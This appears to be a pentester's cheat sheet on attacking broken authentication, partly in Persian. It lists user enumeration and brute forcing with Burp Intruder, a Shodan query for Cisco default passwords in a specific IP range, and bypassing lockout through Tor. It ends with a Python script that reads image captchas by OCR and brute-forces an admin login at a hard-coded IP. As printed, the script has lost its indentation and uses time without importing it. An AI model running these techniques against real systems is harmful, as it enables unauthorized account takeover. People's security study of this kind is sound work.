# Broken Authentication

## User Enumeration
- Burp => Intuder => Grep & Match: ```Incorrect```

## Password Attack
- Burp => Intruder => Attack type: Cluster Bomb

## Default Password
- Shodan => ```net:"77.36.0.0/16" cisco default password```

## Weak Lock Out Mechanism
- استفاده از قفل بازه زمانی
- Bypass with Tor

## Weaker Authentication in Alternative Channel
- Check Mobile app functionality to bypass Web app

## Image Captcha Bypass
- Extract text of image captcha, and brute force the login page
- The image tag is: ```<img id="captcha-image" src="<datauri>"></img>```
- The incorrect attempts can be identified by the "Error!" string.
- Pyton script:
  - fetch the captcha datauri and the cookie from the webpage
  - use the tesseract python module to retrieve the text from the captcha
  - terate over the password list and send a POST request to the login endpoint along with the required POST parameters
```Python
from PIL import Image
import base64
import pytesseract
import io
import re
import requests
session = requests.Session()
regex = '<img id="captcha-image" src="(.*?)"></img>'
with open('passwords.txt','r') as f:
for password in f:
password = password.rstrip()
response = session.get('http://192.232.252.3')
output = re.search(regex, response.text)
cookies=session.cookies.get_dict()
imgstring = output.group(1).split('base64,')[-1].strip()
image_string = io.BytesIO(base64.b64decode(imgstring))
image = Image.open(image_string)
captcha=pytesseract.image_to_string(image)
print("Trying Password: "+password)
data={"username":"admin","password":password,"captcha":captcha}
output=session.post('http://192.232.252.3/login', cookies=cookies,data=data)
if("Error" not in output.text):
print("Password Found: "+password)
break
time.sleep(0.250)
```
